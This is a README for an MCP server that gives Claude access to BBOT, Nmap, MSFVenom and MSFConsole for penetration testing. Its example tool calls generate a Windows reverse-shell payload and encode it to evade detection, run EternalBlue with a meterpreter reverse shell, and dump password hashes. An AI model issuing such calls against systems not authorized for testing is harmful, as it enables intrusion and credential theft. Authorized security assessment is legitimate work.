# Security Tools MCP Server

An MCP (Model Context Protocol) server that provides access to security tools including BBOT, Nmap, MSFVenom, and MSFConsole through Claude.

## Overview

This project implements an MCP server that allows Claude to execute various security tools:
- **BBOT**: For reconnaissance and scanning
- **Nmap**: For network discovery and security scanning
- **MSFVenom**: For payload generation
- **MSFConsole**: For running Metasploit Framework commands

The server is designed to prioritize surface discovery and initial access capabilities, making it useful for security assessments and penetration testing tasks.

## Prerequisites

- Node.js (v14+)
- TypeScript
- BBOT, Nmap, MSFVenom, and MSFConsole installed on the system
- Claude with MCP support

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/yourusername/security-tools-mcp.git
   cd security-tools-mcp
   ```

2. Install dependencies:
   ```bash
   npm install
   ```

3. Build the project:
   ```bash
   npm run build
   ```

4. Configure the MCP settings file:
   - For VSCode Claude extension: `~/.config/Code/User/globalStorage/saoudrizwan.claude-dev/settings/cline_mcp_settings.json`
   - For Claude desktop app: `~/Library/Application Support/Claude/claude_desktop_config.json` (macOS) or equivalent on other platforms

   Add the following configuration:
   ```json
   {
     "mcpServers": {
       "security-tools": {
         "command": "node",
         "args": ["/absolute/path/to/security-tools-mcp/build/index.js"],
         "disabled": false,
         "autoApprove": []
       }
     }
   }
   ```

## Usage

The server provides the following tools that can be accessed through Claude:

### BBOT Tools

#### bbot_scan_target
Run a BBOT scan against a target.

```
<use_mcp_tool>
<server_name>security-tools</server_name>
<tool_name>bbot_scan_target</tool_name>
<arguments>
{
  "target": "example.com",
  "modules": ["subdomain_enum", "web_discovery"],
  "outputFormat": "json",
  "depth": 2
}
</arguments>
</use_mcp_tool>
```

#### bbot_enumerate_subdomains
Discover subdomains for a given domain.

```
<use_mcp_tool>
<server_name>security-tools</server_name>
<tool_name>bbot_enumerate_subdomains</tool_name>
<arguments>
{
  "domain": "example.com",
  "depth": 2,
  "techniques": ["dns", "scrape"]
}
</arguments>
</use_mcp_tool>
```

### Nmap Tools

#### nmap_host_discovery
Find live hosts in a network.

```
<use_mcp_tool>
<server_name>security-tools</server_name>
<tool_name>nmap_host_discovery</tool_name>
<arguments>
{
  "target": "192.168.1.0/24",
  "technique": "PE",
  "timing": 3
}
</arguments>
</use_mcp_tool>
```

#### nmap_port_scan
Scan for open ports with service detection.

```
<use_mcp_tool>
<server_name>security-tools</server_name>
<tool_name>nmap_port_scan</tool_name>
<arguments>
{
  "target": "192.168.1.1",
  "ports": "22,80,443",
  "scanType": "SYN",
  "timing": 3,
  "serviceDetection": true
}
</arguments>
</use_mcp_tool>
```

#### nmap_service_fingerprint
Detailed service version detection.

```
<use_mcp_tool>
<server_name>security-tools</server_name>
<tool_name>nmap_service_fingerprint</tool_name>
<arguments>
{
  "target": "192.168.1.1",
  "ports": "open",
  "intensity": 7
}
</arguments>
</use_mcp_tool>
```

### MSFVenom Tools

#### msfvenom_generate_payload
Create payloads optimized for initial access.

```
<use_mcp_tool>
<server_name>security-tools</server_name>
<tool_name>msfvenom_generate_payload</tool_name>
<arguments>
{
  "payloadType": "reverse_tcp",
  "platform": "windows",
  "format": "exe",
  "ip": "192.168.1.100",
  "port": 4444
}
</arguments>
</use_mcp_tool>
```

#### msfvenom_encode_payload
Apply encoders to evade detection.

```
<use_mcp_tool>
<server_name>security-tools</server_name>
<tool_name>msfvenom_encode_payload</tool_name>
<arguments>
{
  "payloadFile": "/path/to/payload.bin",
  "encoder": "x86/shikata_ga_nai",
  "iterations": 3,
  "outputFormat": "raw"
}
</arguments>
</use_mcp_tool>
```

### MSFConsole Tools

#### msfconsole_run_exploit
Execute exploits for initial access vectors.

```
<use_mcp_tool>
<server_name>security-tools</server_name>
<tool_name>msfconsole_run_exploit</tool_name>
<arguments>
{
  "exploitModule": "exploit/windows/smb/ms17_010_eternalblue",
  "target": "192.168.1.1",
  "payload": "windows/meterpreter/reverse_tcp",
  "options": {
    "LHOST": "192.168.1.100",
    "LPORT": "4444"
  }
}
</arguments>
</use_mcp_tool>
```

#### msfconsole_post_exploitation
Run post-exploitation modules.

```
<use_mcp_tool>
<server_name>security-tools</server_name>
<tool_name>msfconsole_post_exploitation</tool_name>
<arguments>
{
  "sessionId": 1,
  "module": "post/windows/gather/hashdump",
  "options": {
    "SESSION": 1
  }
}
</arguments>
</use_mcp_tool>
```

#### msfconsole_run_command
Run arbitrary MSF commands.

```
<use_mcp_tool>
<server_name>security-tools</server_name>
<tool_name>msfconsole_run_command</tool_name>
<arguments>
{
  "command": "sessions -l"
}
</arguments>
</use_mcp_tool>
```

## Project Structure

```
security-tools-mcp/
├── src/
│   ├── tools/
│   │   ├── bbot.ts       # BBOT tool implementation
│   │   ├── nmap.ts       # Nmap tool implementation
│   │   ├── msfvenom.ts   # MSFVenom tool implementation
│   │   ├── msfconsole.ts # MSFConsole tool implementation
│   │   └── index.ts      # Tool exports
│   ├── utils.ts          # Utility functions
│   └── index.ts          # Main server implementation
├── build/                # Compiled JavaScript files
├── package.json          # Project dependencies and scripts
├── tsconfig.json         # TypeScript configuration
└── README.md             # This file
```

## Security Considerations

This server executes potentially dangerous security tools. Please consider the following:

- **Authorization**: All tools require explicit approval before execution for security reasons.
- **Input Validation**: The server implements input sanitization to prevent command injection.
- **Permissions**: Ensure the server runs with appropriate permissions.
- **Legal Considerations**: Only use these tools on systems you have explicit permission to test.
- **Ethical Use**: This server is intended for legitimate security testing and educational purposes only.

## Development

To contribute to this project:

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/your-feature-name`
3. Commit your changes: `git commit -am 'Add some feature'`
4. Push to the branch: `git push origin feature/your-feature-name`
5. Submit a pull request

## License

MIT License

Copyright (c) 2025

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
